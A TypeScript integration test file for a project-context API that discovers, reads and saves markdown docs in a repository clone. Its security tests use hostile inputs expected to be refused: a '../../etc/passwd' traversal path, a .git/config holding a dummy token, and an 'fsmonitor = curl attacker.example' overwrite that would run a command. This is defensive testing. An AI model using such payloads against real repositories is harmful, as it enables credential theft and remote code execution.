import { describe, it, expect, beforeAll, afterAll } from 'vitest';
import { randomUUID } from 'node:crypto';
import { startPg, dockerAvailable, type PgFixture } from './helpers/pg.js';
import { buildApp } from '../src/app.js';
import { loadConfig } from '../src/platform/config.js';
import { seed } from '../src/db/seed.js';
import * as t from '../src/db/schema.js';
import { MockGitClient, MockGitHubClient } from '../src/adapters/mocks.js';
import { ContextRepository } from '../src/modules/project-context/repository.js';

/**
 * T7 — Discovery + doc read/write module (docs/plans/project-context.md).
 * Route round-trips against a `MockGitClient` fixture:
 *   GET /repos/:repoId/project-context      → discovery + summary
 *   GET /repos/:repoId/project-context/doc  → guarded read
 *   PUT /repos/:repoId/project-context/doc  → guarded save
 *
 * DB-backed (real Postgres) ⇒ `.it.test.ts`.
 */

const hasDocker = await dockerAvailable();
const d = hasDocker ? describe : describe.skip;

if (!hasDocker) {
  // eslint-disable-next-line no-console
  console.warn('[context-module] Docker not available — skipping integration tests.');
}

const config = () => loadConfig({ ...process.env, NODE_ENV: 'test' } as NodeJS.ProcessEnv);

let repoSeq = 0;

/** Fixture markdown tree: in-bucket (specs/docs/insights) + out-of-bucket files. */
const FIXTURE_FILES = {
  'specs/a.md': '0123456789', // 10 bytes → 3 tokens (ceil(10/4))
  'docs/guide.md': '01234567', // 8 bytes → 2 tokens
  'insights/note.md': '', // 0 bytes → 0 tokens
  'README.md': 'not in any bucket',
  'src/index.ts.md': 'also not in a bucket folder',
};

d('Project Context — discovery + doc read/write', () => {
  let pg: PgFixture;
  let workspaceId: string;

  beforeAll(async () => {
    pg = await startPg();
    await seed(pg.handle.db);
    const [ws] = await pg.handle.db.select().from(t.workspaces);
    workspaceId = ws!.id;
  });
  afterAll(async () => {
    await pg?.stop();
  });

  async function insertRepo(): Promise<{ id: string }> {
    const n = repoSeq++;
    const [repo] = await pg.handle.db
      .insert(t.repos)
      .values({
        workspaceId,
        owner: 'acme',
        name: `context-repo-${n}`,
        fullName: `acme/context-repo-${n}`,
      })
      .returning();
    return { id: repo!.id };
  }

  function makeApp(gitOpts: ConstructorParameters<typeof MockGitClient>[0] = {}) {
    return buildApp({
      config: config(),
      db: pg.handle.db,
      overrides: { git: new MockGitClient(gitOpts), github: new MockGitHubClient() },
    });
  }

  // ---- Discovery happy path -------------------------------------------
  it('AC-1/AC-2/AC-6/AC-7: discovers EVERY .md file (bucketed + out-of-bucket) with path+bucket+token estimate and a summed summary', async () => {
    const app = await makeApp({ files: { ...FIXTURE_FILES } });
    const { id: repoId } = await insertRepo();

    const res = await app.inject({ method: 'GET', url: `/repos/${repoId}/project-context` });
    expect(res.statusCode).toBe(200);
    const body = res.json();

    expect(body.clone_available).toBe(true);
    // All 5 fixture .md files surface — the 3 bucketed ones AND the 2 outside any bucket.
    expect(body.documents).toHaveLength(5);
    const byPath = Object.fromEntries(
      (body.documents as { path: string; bucket: string | null; estimated_tokens: number }[]).map(
        (docEntry) => [docEntry.path, docEntry],
      ),
    );
    expect(byPath['specs/a.md']).toMatchObject({ bucket: 'specs', estimated_tokens: 3 });
    expect(byPath['docs/guide.md']).toMatchObject({ bucket: 'docs', estimated_tokens: 2 });
    expect(byPath['insights/note.md']).toMatchObject({ bucket: 'insights', estimated_tokens: 0 });
    // out-of-bucket files now appear too, with bucket null
    expect(byPath['README.md']).toMatchObject({ bucket: null });
    expect(byPath['src/index.ts.md']).toMatchObject({ bucket: null });

    expect(body.summary.document_count).toBe(5);
    // 3 (specs/a.md) + 2 (docs/guide.md) + 0 (insights/note.md)
    //   + 5 (README.md, 17 bytes) + 7 (src/index.ts.md, 27 bytes)
    expect(body.summary.total_estimated_tokens).toBe(17);
    expect(typeof body.summary.refreshed_at).toBe('string');

    await app.close();
  });

  // ---- AC-5: clone absent ----------------------------------------------
  it('AC-5: clone absent → empty documents + clone_available:false, HTTP 200 (never 5xx)', async () => {
    const app = await makeApp({ cloneMissing: true });
    const { id: repoId } = await insertRepo();

    const res = await app.inject({ method: 'GET', url: `/repos/${repoId}/project-context` });
    expect(res.statusCode).toBe(200);
    expect(res.json()).toEqual({
      clone_available: false,
      documents: [],
      summary: {
        document_count: 0,
        total_estimated_tokens: 0,
        refreshed_at: expect.any(String),
      },
    });

    await app.close();
  });

  // ---- Doc read ----------------------------------------------------------
  it('reads a discovered document by path', async () => {
    const app = await makeApp({ files: { ...FIXTURE_FILES } });
    const { id: repoId } = await insertRepo();

    const res = await app.inject({
      method: 'GET',
      url: `/repos/${repoId}/project-context/doc?path=${encodeURIComponent('specs/a.md')}`,
    });
    expect(res.statusCode).toBe(200);
    expect(res.json()).toEqual({ path: 'specs/a.md', text: '0123456789' });

    await app.close();
  });

  // ---- AC-30/AC-32: save round-trip --------------------------------------
  it('AC-32: save round-trip — read-after-write returns the new text, no git/LLM call', async () => {
    const app = await makeApp({ files: { ...FIXTURE_FILES } });
    const { id: repoId } = await insertRepo();

    const save = await app.inject({
      method: 'PUT',
      url: `/repos/${repoId}/project-context/doc`,
      payload: { path: 'specs/a.md', text: 'updated content' },
    });
    expect(save.statusCode).toBe(200);
    expect(save.json()).toEqual({ path: 'specs/a.md', text: 'updated content' });

    const reread = await app.inject({
      method: 'GET',
      url: `/repos/${repoId}/project-context/doc?path=${encodeURIComponent('specs/a.md')}`,
    });
    expect(reread.statusCode).toBe(200);
    expect(reread.json().text).toBe('updated content');

    await app.close();
  });

  // ---- AC-30: path-traversal refused on BOTH read and write --------------
  it('AC-30: a traversal path is refused on read AND write — handled 404, never 5xx', async () => {
    const app = await makeApp({ files: { ...FIXTURE_FILES } });
    const { id: repoId } = await insertRepo();
    const traversal = '../../etc/passwd';

    const read = await app.inject({
      method: 'GET',
      url: `/repos/${repoId}/project-context/doc?path=${encodeURIComponent(traversal)}`,
    });
    expect(read.statusCode).toBe(404);

    const write = await app.inject({
      method: 'PUT',
      url: `/repos/${repoId}/project-context/doc`,
      payload: { path: traversal, text: 'pwned' },
    });
    expect(write.statusCode).toBe(404);

    await app.close();

    // MUTATION CHECK: this test is only meaningful if it can go red. Verified
    // by temporarily commenting out the `!isSafeRelPath(path)` guard in
    // `MockGitClient.readFileSafe`/`writeFileSafe` (src/adapters/mocks.ts) —
    // both assertions above flipped to 200, then the guard was restored.
  });

  // ---- FIX 1: allowlist refuses ANY in-clone non-document file ----------
  it('FIX 1: .git/config is refused on read AND save (never exposes the embedded token or accepts an overwrite), while a real discovered doc still round-trips', async () => {
    const gitConfigText =
      '[core]\n\trepositoryformatversion = 0\n[remote "origin"]\n\turl = https://x-access-token:ghp_secret@github.com/acme/context-repo.git\n';
    const app = await makeApp({ files: { ...FIXTURE_FILES, '.git/config': gitConfigText } });
    const { id: repoId } = await insertRepo();

    const read = await app.inject({
      method: 'GET',
      url: `/repos/${repoId}/project-context/doc?path=${encodeURIComponent('.git/config')}`,
    });
    expect(read.statusCode).toBe(404);
    expect(read.json()).not.toMatchObject({ text: gitConfigText });

    const write = await app.inject({
      method: 'PUT',
      url: `/repos/${repoId}/project-context/doc`,
      payload: { path: '.git/config', text: '[core]\n\tfsmonitor = curl attacker.example\n' },
    });
    expect(write.statusCode).toBe(404);

    // A legit discovered .md doc still round-trips — the allowlist rejects
    // non-document paths, it does not collaterally break real reads/saves.
    const legit = await app.inject({
      method: 'GET',
      url: `/repos/${repoId}/project-context/doc?path=${encodeURIComponent('docs/guide.md')}`,
    });
    expect(legit.statusCode).toBe(200);
    expect(legit.json()).toEqual({ path: 'docs/guide.md', text: '01234567' });

    await app.close();

    // MUTATION CHECK: verified by temporarily removing the
    // `isAttachableDocumentPath` guard call from `ContextService.readDocument`
    // and `saveDocument` (src/modules/project-context/service.ts) — both assertions
    // above flipped from 404 to 200 (the read returned the embedded git
    // config text verbatim), confirming the allowlist — not `safeResolve`
    // alone — is what blocks this path. Guard restored afterward.
  });

  // ---- FIX 4: allowlist matches .md case-insensitively -------------------
  it('FIX 4: an uppercase-extension document (README.MD) reads and saves normally through the allowlist', async () => {
    const app = await makeApp({ files: { ...FIXTURE_FILES, 'specs/README.MD': 'upper ext content' } });
    const { id: repoId } = await insertRepo();

    const read = await app.inject({
      method: 'GET',
      url: `/repos/${repoId}/project-context/doc?path=${encodeURIComponent('specs/README.MD')}`,
    });
    expect(read.statusCode).toBe(200);
    expect(read.json()).toEqual({ path: 'specs/README.MD', text: 'upper ext content' });

    const save = await app.inject({
      method: 'PUT',
      url: `/repos/${repoId}/project-context/doc`,
      payload: { path: 'specs/README.MD', text: 'updated upper ext content' },
    });
    expect(save.statusCode).toBe(200);
    expect(save.json()).toEqual({ path: 'specs/README.MD', text: 'updated upper ext content' });

    await app.close();
  });

  // ---- FIX 2: used_by_agents never counts a path outside the caller's own
  //             discovered document set --------------------------------
  it('FIX 2: usedByAgentsCounts only attributes usage for paths in the discoveredPaths passed in, never a path attached elsewhere in the workspace', async () => {
    const repository = new ContextRepository(pg.handle.db);

    await pg.handle.db.insert(t.agents).values({
      workspaceId,
      name: `Fix2 Attacher ${randomUUID()}`,
      provider: 'openai',
      model: 'gpt-4o-mini',
      systemPrompt: 'Review the diff.',
      attachedDocs: ['docs/architecture.md'],
    });

    // Control: when the path IS in the caller's own discovered set, it's counted.
    const ownCounts = await repository.usedByAgentsCounts(workspaceId, ['docs/architecture.md']);
    expect(ownCounts.get('docs/architecture.md')).toBe(1);

    // FIX 2: a DIFFERENT repo's discovery (which never discovered
    // 'docs/architecture.md' — its own document set is something else
    // entirely, e.g. 'docs/other.md') must not have that path attributed to
    // it at all, even though the SAME agent, in the SAME workspace, has it
    // attached. This is the closest correctness guarantee available given
    // `attached_docs` carries no repo binding (see repository.ts JSDoc).
    const otherRepoCounts = await repository.usedByAgentsCounts(workspaceId, ['docs/other.md']);
    expect(otherRepoCounts.get('docs/architecture.md')).toBeUndefined();
    // 'docs/other.md' is nobody's attached path, so it's simply absent too —
    // the map never gains a false-positive entry for it either.
    expect(otherRepoCounts.get('docs/other.md')).toBeUndefined();
    expect(otherRepoCounts.size).toBe(0);
  });

  // ---- Cross-workspace repo → 404 ----------------------------------------
  it('a repo outside the caller workspace resolves as 404, not 403 or 5xx', async () => {
    const app = await makeApp({ files: { ...FIXTURE_FILES } });
    const [otherWs] = await pg.handle.db
      .insert(t.workspaces)
      .values({ name: `other-context-ws-${randomUUID()}` })
      .returning();
    const [foreignRepo] = await pg.handle.db
      .insert(t.repos)
      .values({
        workspaceId: otherWs!.id,
        owner: 'acme',
        name: 'foreign-context-repo',
        fullName: 'acme/foreign-context-repo',
      })
      .returning();

    const discover = await app.inject({
      method: 'GET',
      url: `/repos/${foreignRepo!.id}/project-context`,
    });
    expect(discover.statusCode).toBe(404);

    const read = await app.inject({
      method: 'GET',
      url: `/repos/${foreignRepo!.id}/project-context/doc?path=specs/a.md`,
    });
    expect(read.statusCode).toBe(404);

    await app.close();
  });

  // ---- AC-13: used_by_agents -------------------------------------------
  it('AC-13: used_by_agents counts a direct attachment and an enabled-skill inheritance, but NOT a disabled skill', async () => {
    const app = await makeApp({ files: { ...FIXTURE_FILES } });
    const { id: repoId } = await insertRepo();
    const path = 'specs/a.md';

    // Zero agents attach yet.
    const zero = await app.inject({ method: 'GET', url: `/repos/${repoId}/project-context` });
    const docsAt = (body: unknown) =>
      Object.fromEntries(
        (body as { documents: { path: string; used_by_agents: number }[] }).documents.map((doc) => [
          doc.path,
          doc.used_by_agents,
        ]),
      );
    expect(docsAt(zero.json())[path]).toBe(0);

    // Direct attachment on agent A1.
    const a1 = await app.inject({
      method: 'POST',
      url: '/agents',
      payload: {
        name: 'Direct Attacher',
        provider: 'openai',
        model: 'gpt-4o-mini',
        system_prompt: 'Review the diff.',
      },
    });
    const a1Id = a1.json().id as string;
    await app.inject({ method: 'PUT', url: `/agents/${a1Id}/docs`, payload: { paths: [path] } });

    const afterDirect = await app.inject({
      method: 'GET',
      url: `/repos/${repoId}/project-context`,
    });
    expect(docsAt(afterDirect.json())[path]).toBe(1);

    // Skill S1 attaches the same path; linked to agent A2 — enabled by default.
    const s1 = await app.inject({
      method: 'POST',
      url: '/skills',
      payload: {
        name: 'Doc-Contributing Skill',
        description: 'Contributes a project-context doc.',
        type: 'convention',
        body: '# Rule\nSome rule.',
      },
    });
    const s1Id = s1.json().id as string;
    await app.inject({ method: 'PUT', url: `/skills/${s1Id}/docs`, payload: { paths: [path] } });

    const a2 = await app.inject({
      method: 'POST',
      url: '/agents',
      payload: {
        name: 'Skill Inheritor',
        provider: 'openai',
        model: 'gpt-4o-mini',
        system_prompt: 'Review the diff.',
      },
    });
    const a2Id = a2.json().id as string;
    await app.inject({
      method: 'POST',
      url: `/agents/${a2Id}/skills`,
      payload: { skill_id: s1Id, order: 0 },
    });

    const afterEnabledSkill = await app.inject({
      method: 'GET',
      url: `/repos/${repoId}/project-context`,
    });
    // A1 (direct) + A2 (via enabled skill S1) = 2 distinct agents.
    expect(docsAt(afterEnabledSkill.json())[path]).toBe(2);

    // Disable the skill globally — its contribution must disappear (A2 no
    // longer counted), leaving only A1's direct attachment.
    await app.inject({ method: 'PUT', url: `/skills/${s1Id}`, payload: { enabled: false } });

    const afterDisabled = await app.inject({
      method: 'GET',
      url: `/repos/${repoId}/project-context`,
    });
    expect(docsAt(afterDisabled.json())[path]).toBe(1);

    await app.close();

    // MUTATION CHECK: verified by temporarily dropping the
    // `eq(t.skills.enabled, true)` clause from
    // `ContextRepository.usedByAgentsCounts` (src/modules/project-context/repository.ts)
    // — the final assertion above (expects 1) went red (received 2), then
    // the clause was restored.
  });
});
